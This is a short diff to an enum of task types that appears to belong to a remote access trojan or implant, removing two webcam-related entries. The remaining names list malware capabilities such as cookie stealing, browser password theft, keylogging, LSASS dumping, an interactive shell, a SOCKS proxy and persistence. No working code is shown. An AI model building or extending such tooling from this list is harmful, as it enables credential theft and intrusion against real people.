@@ -16,7 +16,6 @@ enum class TaskType {
     COOKIE_STEAL,
     BROWSER_PASS,
     INSTALLED_APPS,
-    WEBCAM_STREAM,
     SCREEN_STREAM,
     ISHELL,
     KEYLOG,
@@ -28,7 +27,6 @@ enum class TaskType {
     SOCKS_PROXY,
     ADV_PERSISTENCE,
     DUMP_LSASS,
-    LIST_WEBCAMS,
     GET_LOGS,
     UNKNOWN // For tasks that don't map to a known type
 };
